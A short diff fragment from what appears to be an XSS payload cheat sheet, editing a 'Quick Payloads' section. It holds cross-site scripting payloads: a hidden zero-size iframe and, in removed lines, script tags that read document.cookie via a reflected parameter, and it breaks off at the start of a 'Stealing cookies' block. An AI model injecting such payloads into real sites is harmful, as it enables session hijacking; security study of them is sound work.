@@ -13,8 +13,7 @@ Quick Payloads
 ```
 
 iframe: `<iframe src="http://www.cnn.com" height = "0" width = "0"></iframe>`  
-Stored cookie: `<script>alert(document.cookie)</script>`  
-Reflected (vulnerable parameter): `http://localhost/xss_r/?name=<script>alert(document.cookie)</script`  
+
 Stealing cookies:  
 ```
 <script>
